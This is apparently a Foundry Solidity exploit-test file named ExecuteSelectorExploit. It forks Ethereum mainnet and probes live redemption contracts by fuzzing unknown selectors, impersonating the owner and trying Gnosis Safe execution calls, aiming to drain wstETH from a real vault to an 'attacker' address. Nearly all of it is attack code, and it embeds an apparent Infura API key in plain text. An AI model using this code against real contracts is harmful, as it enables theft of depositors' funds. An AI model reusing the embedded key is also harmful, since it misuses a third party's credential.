// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ExecuteSelectorExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckSuccessfulSelectorsBehavior() public {
        console.log("=== CHECKING SUCCESSFUL SELECTORS BEHAVIOR ===\n");

        // These selectors returned success with (address, bytes):
        // 0xeda72134, 0x900fd1ed, 0x9307e802, 0xa82b69ff
        // 0x3a2ef9df, 0x458f5815, 0x51cbf345, 0x3f14c193

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker);

        // Test each selector that succeeded
        bytes4[8] memory successSels = [
            bytes4(0xeda72134),
            bytes4(0x900fd1ed),
            bytes4(0x9307e802),
            bytes4(0xa82b69ff),
            bytes4(0x3a2ef9df),
            bytes4(0x458f5815),
            bytes4(0x51cbf345),
            bytes4(0x3f14c193)
        ];

        for (uint i = 0; i < successSels.length; i++) {
            console.log("\nTesting selector:");
            console.logBytes4(successSels[i]);

            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);

            (bool s1, bytes memory d1) = REDEMPTION_0.call(
                abi.encodeWithSelector(successSels[i], REDEMPTION_CONTROLLER, rcRedeemCall)
            );
            console.log("  Success:", s1);

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            if (vaultAfter < vaultNow) {
                console.log("  *** VAULT DRAINED! ***");
                console.log("  Drained:", (vaultNow - vaultAfter) / 1e18, "wstETH");
            }

            if (s1 && d1.length > 0) {
                console.log("  Return length:", d1.length);
                if (d1.length >= 32) {
                    console.log("  First 32 bytes:", uint256(bytes32(d1)));
                }
            }
        }

        vm.stopPrank();

        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("\nFinal vault:", vaultFinal / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
    }

    function test_DecodeSuccessfulSelectors() public view {
        console.log("=== DECODING SUCCESSFUL SELECTORS ===\n");

        // Try to find what these selectors might be

        // 0xeda72134 - ?
        // 0x900fd1ed - ?
        // 0x9307e802 - ?
        // 0xa82b69ff - ?
        // 0x3a2ef9df - ?
        // 0x458f5815 - ?
        // 0x51cbf345 - ?
        // 0x3f14c193 - ?

        // Let's see what they return without params
        console.log("Calling with no params:");

        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(abi.encodeWithSelector(bytes4(0xeda72134)));
        if (s1 && d1.length >= 32) {
            console.log("0xeda72134():", uint256(bytes32(d1)));
        }

        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(abi.encodeWithSelector(bytes4(0x900fd1ed)));
        if (s2 && d2.length >= 32) {
            console.log("0x900fd1ed():", uint256(bytes32(d2)));
        }

        (bool s3, bytes memory d3) = REDEMPTION_0.staticcall(abi.encodeWithSelector(bytes4(0x9307e802)));
        if (s3 && d3.length >= 32) {
            console.log("0x9307e802():", uint256(bytes32(d3)));
        }

        (bool s4, bytes memory d4) = REDEMPTION_0.staticcall(abi.encodeWithSelector(bytes4(0xa82b69ff)));
        if (s4 && d4.length >= 32) {
            console.log("0xa82b69ff():", uint256(bytes32(d4)));
        }

        (bool s5, bytes memory d5) = REDEMPTION_0.staticcall(abi.encodeWithSelector(bytes4(0x3a2ef9df)));
        if (s5 && d5.length >= 32) {
            console.log("0x3a2ef9df():", uint256(bytes32(d5)));
        }
    }

    function test_TryOwnerFunctions() public {
        console.log("=== TRYING OWNER FUNCTIONS ===\n");

        // Get owner
        bytes32 ownerSlot = vm.load(REDEMPTION_0, bytes32(uint256(0)));
        address owner = address(uint160(uint256(ownerSlot)));
        console.log("REDEMPTION_0 owner:", owner);

        vm.startPrank(owner);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker);

        // Try execute patterns as owner
        console.log("\nTrying as owner:");

        // 0x04824e70 might be execute
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x04824e70), REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("0x04824e70(RC, redeem):", s1);

        // Try just calling RC.redeem directly
        (bool s2,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker)
        );
        console.log("Direct RC.redeem:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
    }

    function test_CheckForForwarderPattern() public {
        console.log("=== CHECKING FOR FORWARDER PATTERN ===\n");

        // Maybe one of the selectors is a forwarder that lets owner execute arbitrary calls

        address owner = address(uint160(uint256(vm.load(REDEMPTION_0, bytes32(uint256(0))))));
        console.log("Owner:", owner);

        vm.startPrank(owner);

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        // Try selectors that might be forwarders
        // 0x51cbf345, 0x3f14c193, 0x196e6b1d

        console.log("Trying potential forwarder selectors as owner:");

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x51cbf345), REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("0x51cbf345:", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x196e6b1d), REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("0x196e6b1d:", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        vm.stopPrank();
    }

    function test_InvestigateRedemption1() public {
        console.log("=== INVESTIGATING REDEMPTION_1 FOR EXECUTE PATTERN ===\n");

        // REDEMPTION_1 has Gnosis Safe at slot 4 and SLOT5_IMPL at slot 5
        // Maybe it has different execute functions

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        bytes memory rcRedeemCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        // Try execute patterns on REDEMPTION_1
        console.log("Trying execute patterns on REDEMPTION_1:");

        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("execute(address,bytes)", REDEMPTION_CONTROLLER, rcRedeemCall)
        );
        console.log("execute(address,bytes):", s1);

        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("execTransactionFromModule(address,uint256,bytes,uint8)",
                REDEMPTION_CONTROLLER, 0, rcRedeemCall, 0)
        );
        console.log("execTransactionFromModule:", s2);

        // Try Gnosis Safe's execTransaction
        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
                REDEMPTION_CONTROLLER, 0, rcRedeemCall, 0, 0, 0, 0, address(0), address(0), "")
        );
        console.log("execTransaction:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** REDEMPTION_1 EXPLOIT WORKED! ***");
        }
    }

    function test_CheckSelectorDb006a75() public {
        console.log("=== CHECKING SELECTOR 0xdb006a75 ===\n");

        // This is redeem(uint256) - different from redeem(uint96)

        deal(IAU, attacker, 100000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0xdb006a75), 100e18)
        );
        console.log("redeem(uint256):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
    }
}
